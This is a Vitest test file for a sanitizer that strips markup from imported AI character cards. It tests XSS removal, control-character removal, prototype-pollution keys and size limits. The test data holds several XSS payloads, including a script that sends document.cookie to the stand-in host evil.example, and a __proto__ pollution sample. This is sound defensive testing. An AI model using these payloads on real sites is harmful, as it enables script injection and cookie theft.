import { describe, expect, it } from 'vitest'

import { CardGateError, gateImportedCard, MAX_CARD_NODES, MAX_CARD_TEXT, plainCardText } from './card-gate'

describe('card gate: plain text', () => {
  it('removes the payloads that ran in AIRI in 2025', () => {
    const attacks = [
      '<img src=x onerror="window.pwned=1">',
      '<script>fetch("https://evil.example/"+document.cookie)</script>',
      '<svg onload=alert(1)>',
      '<a href="javascript:alert(1)">click</a>',
      '<iframe src="data:text/html,<script>1</script>"></iframe>',
      '<!-- <script>x</script> -->',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<IMG SRC=JaVaScRiPt:alert(1)>',
    ]
    for (const attack of attacks) {
      const out = plainCardText(`hello ${attack} world`)
      expect(out, attack).not.toMatch(/<\s*\/?\s*(script|img|svg|iframe|a)\b/i)
      expect(out, attack).not.toMatch(/javascript\s*:|onerror|onload/i)
      expect(out.startsWith('hello')).toBe(true)
    }
  })

  it('keeps everything an honest card has', () => {
    const honest = [
      'You are {{char}}, talking to {{user}}.',
      '# Notes\n- likes **tea**\n- says "hi"',
      'If a < b and c > d then 3<4. Use x<-y.',
      'Tom & Jerry; 5 > 3',
      'नमस्ते, మీరు ఎలా ఉన్నారు? 你好',
      '```ts\nconst a = 1 < 2\n```',
    ]
    for (const text of honest)
      expect(plainCardText(text)).toBe(text)
  })

  it('removes hidden control and direction-override characters', () => {
    expect(plainCardText('a‮b​c\u0007d')).toBe('abcd')
  })

  it('cuts a very long text and says so', () => {
    const { card, report } = gateImportedCard({ description: 'x'.repeat(MAX_CARD_TEXT + 10) })
    expect(card.description).toHaveLength(MAX_CARD_TEXT)
    expect(report.textsCut).toBe(1)
  })
})

describe('card gate: a whole card', () => {
  it('cleans texts at any depth, keeps structure and numbers, and counts what it removed', () => {
    const card = {
      spec: 'chara_card_v3',
      data: {
        name: 'Ana<script>1</script>',
        tags: ['a', '<b>b</b>'],
        extensions: { airi: { modules: { speech: { provider: 'x', rate: 1.5, on: true } } } },
      },
    }
    const { card: out, report } = gateImportedCard(card)
    expect(out).toEqual({ spec: 'chara_card_v3', data: { name: 'Ana1', tags: ['a', 'b'], extensions: { airi: { modules: { speech: { provider: 'x', rate: 1.5, on: true } } } } } })
    expect(report.tagsRemoved).toBe(4)
    expect(card.data.name).toBe('Ana<script>1</script>')
  })

  it('drops keys that could poison objects', () => {
    const hostile = JSON.parse('{"__proto__":{"polluted":true},"constructor":{"x":1},"ok":"fine"}')
    const { card } = gateImportedCard(hostile)
    expect(Object.keys(card)).toEqual(['ok'])
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  it('refuses a card that is huge or nested too deeply', () => {
    expect(() => gateImportedCard({ list: Array.from({ length: MAX_CARD_NODES + 1 }, (_, i) => i) })).toThrow(CardGateError)
    let deep: unknown = 'x'
    for (let i = 0; i < 40; i++)
      deep = { next: deep }
    expect(() => gateImportedCard(deep)).toThrow(CardGateError)
  })
})
